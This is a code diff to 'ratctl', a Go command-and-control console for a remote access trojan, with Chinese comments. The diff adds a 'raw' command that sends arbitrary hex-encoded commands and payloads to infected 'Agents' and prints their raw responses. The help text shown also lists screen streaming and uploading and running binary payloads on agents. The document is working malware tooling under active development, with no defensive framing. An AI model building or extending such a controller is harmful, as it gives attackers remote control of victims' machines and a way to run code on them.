@@ -3,6 +3,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"strconv"
@@ -104,6 +105,8 @@ func (st *shellState) dispatch(line string) bool {
 		} else {
 			st.cmdPayload(rest)
 		}
+	case "raw":
+		st.cmdRaw(args)
 	case "help", "?":
 		printHelp()
 	case "exit", "quit":
@@ -396,6 +399,76 @@ func atoiOr(s string, def int) int {
 	return n
 }
 
+// pluginForCmd 按指令码段推断 plugin 字段（协议 §3：0x1xxx 远程 / 0x2xxx 文件 / 0x3xxx 系统）。
+// C2 目前只按 cmd 路由，但填对 plugin 才不会在后续插件化时踩坑。
+func pluginForCmd(cmd uint16) uint8 {
+	switch cmd >> 12 {
+	case 0x1:
+		return protocol.PluginRemote
+	case 0x2:
+		return protocol.PluginFile
+	case 0x3:
+		return protocol.PluginSys
+	default:
+		return protocol.PluginCore
+	}
+}
+
+// isPrintableText 判断响应是否为可见文本（否则按 hex 打印，避免把 JPEG 糊到终端上）。
+func isPrintableText(s string) bool {
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if c == '\r' || c == '\n' || c == '\t' {
+			continue
+		}
+		if c < 0x20 || c > 0x7e {
+			return false
+		}
+	}
+	return true
+}
+
+// cmdRaw 发送任意业务指令并打印原始响应 —— 用来测**新模块自己的指令**
+// （模块只需在 caps.cpp 里登记指令码，这里就能直接打过去）：
+//
+//	raw <cmd_hex> [payload_hex]     例: raw 2001 deadbeef
+func (st *shellState) cmdRaw(args []string) {
+	if len(args) < 1 {
+		fmt.Println("usage: raw <cmd_hex> [payload_hex]   (例: raw 2001 deadbeef)")
+		return
+	}
+	cmd64, err := strconv.ParseUint(strings.TrimPrefix(args[0], "0x"), 16, 16)
+	if err != nil {
+		fmt.Printf("[!] bad cmd %q: %v\n", args[0], err)
+		return
+	}
+	var payload []byte
+	if len(args) > 1 {
+		payload, err = hex.DecodeString(args[1])
+		if err != nil {
+			fmt.Printf("[!] bad payload hex: %v\n", err)
+			return
+		}
+	}
+	cmd := uint16(cmd64)
+	status, body, err := st.execBusiness(cmd, pluginForCmd(cmd), payload)
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+	fmt.Printf("cmd    : 0x%04x (plugin=0x%02x)\n", cmd, pluginForCmd(cmd))
+	fmt.Printf("status : 0x%02x\n", status)
+	if isPrintableText(body) {
+		fmt.Printf("text   : %s\n", body)
+	} else {
+		h := hex.EncodeToString([]byte(body))
+		if len(h) > 128 {
+			h = h[:128] + "..."
+		}
+		fmt.Printf("binary : %d bytes, hex=%s\n", len(body), h)
+	}
+}
+
 func printHelp() {
 	fmt.Println(`ratctl - C2 交互式控制端
 
@@ -415,6 +488,8 @@ func printHelp() {
   stop                      停止当前 Agent 的屏幕流
   payload <file> [name] [--args <参数>]
                             上传本地二进制 payload 到 Agent 并执行（协议 §10）
+  raw <cmd_hex> [payload_hex]  发送任意业务指令并打印原始响应
+                            （用于测试**新模块自己的指令**，如 raw 2001 deadbeef）
 
 通用:
   help / ?                  显示本帮助
